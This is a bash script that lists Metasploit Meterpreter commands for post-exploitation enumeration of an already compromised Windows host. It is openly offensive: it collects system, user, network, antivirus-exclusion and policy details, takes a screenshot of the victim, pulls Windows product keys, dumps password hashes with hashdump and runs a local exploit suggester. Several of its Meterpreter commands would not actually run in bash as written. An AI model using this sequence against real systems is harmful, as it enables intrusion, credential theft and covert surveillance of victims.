#!/bin/bash

script ./Windows_Ennumeration.txt

clear

#####################################################################
#                                                                   #
# This script is designed to automate enumeration of Windows hosts. #
# This script will likely take a while to complete and requires     #
# that you have already gotten a meterpreter session on your        #
# intended target.                                                  #
#                                                                   #
# Waking_Reality                                                    #
#                                                                   #
#####################################################################

echo "
      __          ___           _                                         
      \ \        / (_)         | |                                        
       \ \  /\  / / _ _ __   __| | _____      _____                       
        \ \/  \/ / | | '_ \ / _` |/ _ \ \ /\ / / __|                      
  ______ \  /\  /  | | | | | (_| | (_) \ V  V /\__ \    _   _             
 |  ____| \/  \/   |_|_| |_|\__,_|\___/ \_/\_/ |___/   | | (_)            
 | |__   _ __  _   _ _ __ ___  _ __ ___   ___ _ __ __ _| |_ _  ___  _ __  
 |  __| | '_ \| | | | '_ ` _ \| '_ ` _ \ / _ \ '__/ _` | __| |/ _ \| '_ \ 
 | |____| | | | |_| | | | | | | | | | | |  __/ | | (_| | |_| | (_) | | | |
 |______|_| |_|\__,_|_| |_| |_|_| |_| |_|\___|_|  \__,_|\__|_|\___/|_| |_|
                                                                          "
echo "========================================================================="
echo " What is the remote system time?                                         "
echo "========================================================================="
echo ""
localtime
echo ""
echo "========================================================================="
echo " What is the basic remote system information?                            "
echo "========================================================================="
echo ""
sysinfo
echo ""
echo "========================================================================="
echo " What is the extensive remote system information?                        "
echo "========================================================================="
echo ""
run multicommand -c "systeminfo"
echo ""
echo "========================================================================="
echo " Is the remote system a virtual machine?                                 "
echo "========================================================================="
echo ""
run post/windows/gather/checkvm
echo ""
echo "========================================================================="
echo " What is the current process identifier?                                 "
echo "========================================================================="
echo ""
getpid
echo ""
echo "========================================================================="
echo " What is the name of the process you are in?                             "
echo "========================================================================="
echo ""
echo "Enter the PID from the last check:"
echo ""
read MPID
echo ""
run multicommand -c "cmd.exe /c tasklist /v | findstr $MPID"
echo ""
echo "========================================================================="
echo " What programs are currently running?                                    "
echo "========================================================================="
echo ""
run multicommand -c "cmd.exe /c tasklist /v"
echo ""
echo "========================================================================="
echo " What is scheduled to run on the remote system?                          "
echo "========================================================================="
echo ""
run multicommand -c "schtasks"
echo ""
echo "========================================================================="
echo " What users are currently logged on?                                     "
echo "========================================================================="
echo ""
run post/windows/gather/enum_logged_on_users
echo ""
echo "========================================================================="
echo " How long has the system been idle for?                                  "
echo "========================================================================="
echo ""
idletime
echo ""
echo "========================================================================="
echo " What is the current remote system directory?                            "
echo "========================================================================="
echo ""
pwd
echo ""
echo "========================================================================="
echo " What is the current local system directory?                             "
echo "========================================================================="
echo ""
lpwd
echo ""
echo "========================================================================="
echo " Is there any known antivirus currently running the remote system?       "
echo "========================================================================="
echo ""
run post/windows/gather/enum_av_excluded
echo ""
echo "========================================================================="
echo " What is the remote system audit policy?                                 "
echo "========================================================================="
echo ""
run multicommand -c "auditpol /get /category:*"
echo ""
echo "========================================================================="
echo " What is the remote system password policy?                              "
echo "========================================================================="
echo ""
run multicommand -c "cmd.exe /c net accounts"
echo ""
echo "========================================================================="
echo " What is the remote system IP Configuration?                             "
echo "========================================================================="
echo ""
run multicommand -c "cmd.exe /c ipconfig /all"
echo ""
echo "========================================================================="
echo " What are the remote system routes?                                      "
echo "========================================================================="
echo ""
route
echo ""
echo "========================================================================="
echo " What are the firewall profiles on the remote system?                    "
echo "========================================================================="
echo ""
run multicommand -c "netsh advfirewall show allprofiles"
echo ""
echo "========================================================================="
echo " What are the current connections?                                       "
echo "========================================================================="
echo ""
run multicommand -c "cmd.exe /c netstat"
echo ""
echo "========================================================================="
echo " What's on the remote system arp table?                                  "
echo "========================================================================="
echo ""
arp
echo ""
echo "========================================================================="
echo " What USB devices have been plugged into the remote system?               "
echo "========================================================================="
echo ""
run post/windows/gather/usb_history
echo ""
echo "========================================================================="
echo " What applications are installed on the remote system?                   "
echo "========================================================================="
echo ""
run post/windows/gather/enum_applications
echo ""
echo "========================================================================="
echo " What shares are available on the remote system?                         "
echo "========================================================================="
run post/windows/gather/enum_shares
echo "========================================================================="
echo " What devices are currently available on the remote system?              "
echo "========================================================================="
echo ""
run post/windows/gather/enum_devices
echo ""
echo "========================================================================="
echo " Time for the remote system to take a selfie...                          "
echo "========================================================================="
echo ""
screenshot
echo ""
echo "========================================================================="
echo " What are the remote system Windows product keys?                        "
echo "========================================================================="
echo ""
run post/windows/gather/enum_ms_product_keys
echo ""
echo "========================================================================="
echo " Let's dump the hashes of the remote system...                           "
echo "========================================================================="
echo ""
hashdump
echo ""
echo "========================================================================="
echo " What's the BitLocker information for the remote system?                 "
echo "========================================================================="
echo ""
run post/windows/gather/enum_ad_bitlocker
echo ""
echo "========================================================================="
echo " What's in the remote system host file?                                  "
echo "========================================================================="
echo ""
run post/windows/gather/enum_hostfile
echo ""
echo "========================================================================="
echo " What exploits might be available on the remote system?                  "
echo "========================================================================="
echo ""
run post/multi/recon/local_exploit_suggester
echo ""
echo "========================================================================="

clear

echo "Please check out the transcript for everything at: ./Windows_Ennumeration.txt"

exit
